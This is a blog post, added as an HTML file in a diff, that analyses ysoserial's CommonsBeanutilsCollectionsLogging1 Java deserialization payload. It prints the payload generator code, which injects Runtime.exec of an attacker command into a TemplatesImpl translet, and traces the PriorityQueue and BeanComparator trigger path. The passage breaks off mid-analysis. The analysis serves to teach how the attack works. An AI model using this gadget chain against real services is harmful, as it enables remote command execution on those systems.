@@ -1,0 +1,373 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Ysoserial中的CommonsBeanutilsCollectionsLogging1分析</title>
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/public/css/amazeui.min.css">
+  <link rel="stylesheet" href="/public/css/app.css">
+</head>
+<body>
+
+<div class="am-container lp-container">
+  <header class="am-topbar lp-topbar">
+    <h1 class="am-topbar-brand">
+      <a href="/">k1n9's Blog</a>
+    </h1>
+    <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-danger am-show-sm-only" data-am-collapse="{target: '#lp-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>
+    <div class="am-collapse am-topbar-collapse am-topbar-right" id="lp-topbar-collapse">
+      <ul class="am-nav am-nav-pills am-topbar-nav">
+        <li><a href="/">Archives</a></li>
+<!--         <li><a href="#">Categories</a></li> -->
+        <li><a href="/friends.html">Friends</a></li>
+   <!--      <li><a href="#">About Me</a></li> -->
+        <li><a href="/rss.xml">Rss</a></li>
+      </ul>
+    </div>
+  </header>
+</div>
+
+
+<div class="am-container lp-container">
+  <div class="lp-post">
+    <div class="lp-post-header">
+      <h1 class="lp-post-title">Ysoserial中的CommonsBeanutilsCollectionsLogging1分析</h1>
+      <div class="lp-post-meta">
+        <i class="am-icon-calculator"></i><span class="lp-post-date">2017-08-17</span>
+        <i class="am-icon-tags"></i><span class="lp-post-tags">Java, Gadgets</span>
+      </div>
+    </div>
+    <div class="lp-post-content">
+    <h2 id="0x00-commonsbeanutilscollectionslogging1">0x00 CommonsBeanutilsCollectionsLogging1</h2>
+<p>依赖：</p>
+<ul>
+  <li>commons-beanutils:1.9.2</li>
+  <li>commons-collections:3.1</li>
+  <li>commons-logging:1.2</li>
+</ul>
+
+<p>ysoserial/payloads/CommonsBeanutilsCollectionsLogging1.java:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonsBeanutilsCollectionsLogging1</span> <span class="kd">implements</span> <span class="nc">ObjectPayload</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="o">{</span>
+
+	<span class="kd">public</span> <span class="nc">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+		<span class="kd">final</span> <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="nc">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+		<span class="c1">// mock method name until armed</span>
+		<span class="kd">final</span> <span class="nc">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BeanComparator</span><span class="o">(</span><span class="s">"lowestSetBit"</span><span class="o">);</span>
+
+		<span class="c1">// create queue with numbers and basic comparator</span>
+		<span class="kd">final</span> <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;(</span><span class="mi">2</span><span class="o">,</span> <span class="n">comparator</span><span class="o">);</span>
+		<span class="c1">// stub data for replacement later</span>
+		<span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+		<span class="n">queue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="nc">BigInteger</span><span class="o">(</span><span class="s">"1"</span><span class="o">));</span>
+
+		<span class="c1">// switch method called by comparator</span>
+		<span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">comparator</span><span class="o">,</span> <span class="s">"property"</span><span class="o">,</span> <span class="s">"outputProperties"</span><span class="o">);</span>
+
+		<span class="c1">// switch contents of queue</span>
+		<span class="kd">final</span> <span class="nc">Object</span><span class="o">[]</span> <span class="n">queueArray</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Object</span><span class="o">[])</span> <span class="nc">Reflections</span><span class="o">.</span><span class="na">getFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span> <span class="s">"queue"</span><span class="o">);</span>
+		<span class="n">queueArray</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+		<span class="n">queueArray</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+
+		<span class="k">return</span> <span class="n">queue</span><span class="o">;</span>
+	<span class="o">}</span>
+
+	<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+		<span class="nc">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="nc">CommonsBeanutilsCollectionsLogging1</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>Ysoserial 中每个 payload 的生成类都需要实现 ObjectPayload 接口中的 getObject 方法，该方法的功能为传入要执行的命令然后返回构造好的对象。</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">final</span> <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="nc">Gadgets</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+</code></pre></div></div>
+<p>从第一句可以看出这里的命令执行需要用到 TemplatesImpl 中的执行链，之前 fastjson 反序列化的 POC 构造也是用的这个，具体可以看参考中的链接。</p>
+
+<h3 id="0x01-templatesimpl-中的执行链">0x01 TemplatesImpl 中的执行链</h3>
+<p>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java中的getOutputProperties():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">synchronized</span> <span class="nc">Properties</span> <span class="nf">getOutputProperties</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="nf">newTransformer</span><span class="o">().</span><span class="na">getOutputProperties</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="k">catch</span> <span class="o">(</span><span class="nc">TransformerConfigurationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>newTransformer():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">synchronized</span> <span class="nc">Transformer</span> <span class="nf">newTransformer</span><span class="o">()</span>
+    <span class="kd">throws</span> <span class="nc">TransformerConfigurationException</span>
+<span class="o">{</span>
+    <span class="nc">TransformerImpl</span> <span class="n">transformer</span><span class="o">;</span>
+
+    <span class="n">transformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TransformerImpl</span><span class="o">(</span><span class="n">getTransletInstance</span><span class="o">(),</span> <span class="n">_outputProperties</span><span class="o">,</span>
+        <span class="n">_indentNumber</span><span class="o">,</span> <span class="n">_tfactory</span><span class="o">);</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="n">_uriResolver</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">transformer</span><span class="o">.</span><span class="na">setURIResolver</span><span class="o">(</span><span class="n">_uriResolver</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="n">_tfactory</span><span class="o">.</span><span class="na">getFeature</span><span class="o">(</span><span class="nc">XMLConstants</span><span class="o">.</span><span class="na">FEATURE_SECURE_PROCESSING</span><span class="o">))</span> <span class="o">{</span>
+        <span class="n">transformer</span><span class="o">.</span><span class="na">setSecureProcessing</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">transformer</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>getTransletInstance():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">Translet</span> <span class="nf">getTransletInstance</span><span class="o">()</span>
+    <span class="kd">throws</span> <span class="nc">TransformerConfigurationException</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">_name</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">_class</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="n">defineTransletClasses</span><span class="o">();</span>
+
+        <span class="c1">// The translet needs to keep a reference to all its auxiliary</span>
+        <span class="c1">// class to prevent the GC from collecting them</span>
+        <span class="nc">AbstractTranslet</span> <span class="n">translet</span> <span class="o">=</span> <span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">)</span> <span class="n">_class</span><span class="o">[</span><span class="n">_transletIndex</span><span class="o">].</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="n">translet</span><span class="o">.</span><span class="na">postInitialization</span><span class="o">();</span>
+        <span class="n">translet</span><span class="o">.</span><span class="na">setTemplates</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+        <span class="n">translet</span><span class="o">.</span><span class="na">setServicesMechnism</span><span class="o">(</span><span class="n">_useServicesMechanism</span><span class="o">);</span>
+        <span class="n">translet</span><span class="o">.</span><span class="na">setAllowedProtocols</span><span class="o">(</span><span class="n">_accessExternalStylesheet</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">_auxClasses</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">translet</span><span class="o">.</span><span class="na">setAuxiliaryClasses</span><span class="o">(</span><span class="n">_auxClasses</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="k">return</span> <span class="n">translet</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="k">catch</span> <span class="o">(</span><span class="nc">InstantiationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ErrorMsg</span><span class="o">(</span><span class="nc">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+    <span class="k">catch</span> <span class="o">(</span><span class="nc">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ErrorMsg</span><span class="o">(</span><span class="nc">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>其中的 defineTransletClasses 方法主要是通过 _bytecodes(存放着字节码)找到对应的 Class 并放到 _class 数组中去，接着会调用 Class 的 newInstance() 实例化。如此一来，只要在一个类中的初始块或者构造器中加入执行命令的代码，再把这个类的字节码传给 _bytecodes 就行。
+完整的执行链:
+getOutputProperties() –&gt; newTransformer() –&gt; getTransletInstance() –&gt; newInstance()
+根据这个执行链，只要找到一个在反序列化的时候会调用 TemplatesImpl.getOutputProperties() 就行，要注意的是这个执行链能执行到最终需要 _name，_bytecodes 和 _tfactory(在defineTransletClasses 方法中会用到)这三个变量不能为 null。</p>
+
+<p>来看下 Ysoserial 是如何构造该执行链的。
+ysoserial/payloads/util/Gadgets.java中的createTemplatesImpl():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="nc">TemplatesImpl</span> <span class="nf">createTemplatesImpl</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+	<span class="kd">final</span> <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplatesImpl</span><span class="o">();</span>
+
+	<span class="c1">// use template gadget class</span>
+	<span class="nc">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="nc">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+	<span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="nc">ClassClassPath</span><span class="o">(</span><span class="nc">StubTransletPayload</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
+	<span class="kd">final</span> <span class="nc">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="nc">StubTransletPayload</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+	<span class="c1">// run command in static initializer</span>
+	<span class="c1">// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span>
+	<span class="n">clazz</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertAfter</span><span class="o">(</span><span class="s">"java.lang.Runtime.getRuntime().exec(\""</span> <span class="o">+</span> <span class="n">command</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\""</span><span class="o">,</span> <span class="s">"\\\""</span><span class="o">)</span> <span class="o">+</span><span class="s">"\");"</span><span class="o">);</span>
+	<span class="c1">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span>
+	<span class="n">clazz</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">"ysoserial.Pwner"</span> <span class="o">+</span> <span class="nc">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">());</span>
+
+	<span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+
+	<span class="c1">// inject class bytes into instance</span>
+	<span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span> <span class="o">{</span>
+		<span class="n">classBytes</span><span class="o">,</span>
+		<span class="nc">ClassFiles</span><span class="o">.</span><span class="na">classAsBytes</span><span class="o">(</span><span class="nc">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">)});</span>
+
+	<span class="c1">// required to make TemplatesImpl happy</span>
+	<span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"Pwnr"</span><span class="o">);</span>
+	<span class="nc">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">TransformerFactoryImpl</span><span class="o">());</span>
+	<span class="k">return</span> <span class="n">templates</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>这里主要是用到了 Javassist 这个库来处理字节码，这库厉害在于它可以在运行时动态的去修改 Java 的字节码。先是获得一个 ClassPool 对象，然后添加类的搜索路径。个人觉得 StubTransletPayload 这个类就定义在这里，添加这个搜索路径貌似作用不大。接下来就是获得 StubTransletPayload 类的 CtClass(compile-time clas)引用，然后就是往里面插入一段带有执行命令代码的静态初始化块。看下 StubTransletPayload :</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">StubTransletPayload</span> <span class="kd">extends</span> <span class="nc">AbstractTranslet</span> <span class="kd">implements</span> <span class="nc">Serializable</span> <span class="o">{</span>
+	<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="o">-</span><span class="mi">5971610431559700674L</span><span class="o">;</span>
+
+	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="no">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="nc">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">TransletException</span> <span class="o">{}</span>
+
+	<span class="nd">@Override</span>
+	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="no">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="nc">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="nc">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">TransletException</span> <span class="o">{}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>因为_bytecodes需要是translet class，这里是继承了AbstractTranslet这个抽象类。那么StubTransletPayload也得定义为抽象类，要不就得重写AbstractTranslet中的这两个方法，抽象类没法实例化，所以就只能选择去重写这两个方法了。
+关于 Javassist 这个库的具体使用可以看参考里面的链接，本地写了一小段测试代码：
+<img src="https://i.loli.net/2017/08/17/59950c4a17c10.png" alt="" />
+再看下生成的字节码和反编译的源码：
+<img src="https://i.loli.net/2017/08/17/59950c67b9ee7.png" alt="" />
+设置 templates 中三个成员变量的值得时候用到了反射，Ysoserial 里自己写了个 Reflections 类，可以去看下:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Reflections</span> <span class="o">{</span>
+	<span class="kd">public</span> <span class="kd">static</span> <span class="nc">Field</span> <span class="nf">getField</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+		<span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+		<span class="k">if</span> <span class="o">(</span><span class="n">field</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+			<span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+		<span class="o">}</span>
+		<span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+		<span class="k">return</span> <span class="n">field</span><span class="o">;</span>
+	<span class="o">}</span>
+
+	<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+		<span class="kd">final</span> <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+		<span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+	<span class="o">}</span>
+
+	<span class="kd">public</span> <span class="kd">static</span> <span class="nc">Object</span> <span class="nf">getFieldValue</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+		<span class="kd">final</span> <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>		
+		<span class="k">return</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+	<span class="o">}</span>
+
+	<span class="kd">public</span> <span class="kd">static</span> <span class="nc">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">getFirstCtor</span><span class="o">(</span><span class="kd">final</span> <span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+		<span class="kd">final</span> <span class="nc">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">ctor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">name</span><span class="o">).</span><span class="na">getDeclaredConstructors</span><span class="o">()[</span><span class="mi">0</span><span class="o">];</span>
+	    <span class="n">ctor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+	    <span class="k">return</span> <span class="n">ctor</span><span class="o">;</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>对于这个类感觉要是知道反射怎么用的话都好理解。在 getField 方法中，要是当前类找不到还会去父类里面找，并且用了 setAccessible(true)来使得那些设置了 private 的成员变量也能访问到。
+到这里就获取到了一个构造好的 TemplatesImpl 对象，就差 getOutputProperties()怎么被调用了。</p>
+
+<h3 id="0x02-利用链的构造">0x02 利用链的构造</h3>
+<p>目前的理解是在 Java 中反序列化后能自动调用的就 readObject 方法，这里就用到了 PriorityQueue(优先级队列)类中重写的 readObject():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="nc">ClassNotFoundException</span> <span class="o">{</span>
+    <span class="c1">// Read in size, and any hidden stuff</span>
+    <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+
+    <span class="c1">// Read in (and discard) array length</span>
+    <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
+
+    <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="n">size</span><span class="o">];</span>
+
+    <span class="c1">// Read in all elements.</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span>
+        <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+
+    <span class="c1">// Elements are guaranteed to be in "proper order", but the</span>
+    <span class="c1">// spec has never explained what that might be.</span>
+    <span class="n">heapify</span><span class="o">();</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>反序列化后存到 queue 数组中，再进入heapif():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">heapify</span><span class="o">()</span> <span class="o">{</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="o">(</span><span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">--)</span>
+        <span class="n">siftDown</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="o">(</span><span class="no">E</span><span class="o">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>这里应该做的是排序操作，往下再跟 siftDown()，siftDownUsingComparator():</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">siftDown</span><span class="o">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">,</span> <span class="no">E</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">comparator</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+        <span class="n">siftDownUsingComparator</span><span class="o">(</span><span class="n">k</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
+    <span class="k">else</span>
+        <span class="nf">siftDownComparable</span><span class="o">(</span><span class="n">k</span><span class="o">,</span> <span class="n">x</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">siftDownUsingComparator</span><span class="o">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">,</span> <span class="no">E</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
+    <span class="kt">int</span> <span class="n">half</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="o">;</span>
+    <span class="k">while</span> <span class="o">(</span><span class="n">k</span> <span class="o">&lt;</span> <span class="n">half</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="o">(</span><span class="n">k</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
+        <span class="nc">Object</span> <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span><span class="o">];</span>
+        <span class="kt">int</span> <span class="n">right</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">right</span> <span class="o">&lt;</span> <span class="n">size</span> <span class="o">&amp;&amp;</span>
+            <span class="n">comparator</span><span class="o">.</span><span class="na">compare</span><span class="o">((</span><span class="no">E</span><span class="o">)</span> <span class="n">c</span><span class="o">,</span> <span class="o">(</span><span class="no">E</span><span class="o">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">right</span><span class="o">])</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span> <span class="o">=</span> <span class="n">right</span><span class="o">];</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">comparator</span><span class="o">.</span><span class="na">compare</span><span class="o">(</span><span class="n">x</span><span class="o">,</span> <span class="o">(</span><span class="no">E</span><span class="o">)</span> <span class="n">c</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="o">)</span>
+            <span class="k">break</span><span class="o">;</span>
+        <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">c</span><span class="o">;</span>
+        <span class="n">k</span> <span class="o">=</span> <span class="n">child</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">x</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>siftDownUsingComparator 方法才是这里的重点，这里将序列化后得到的对象传入了比较器 comparator 中的 compare 方法中去，在 CommonsBeanutilsCollectionsLogging1 中这个比较器用的是 BeanComparator:</p>
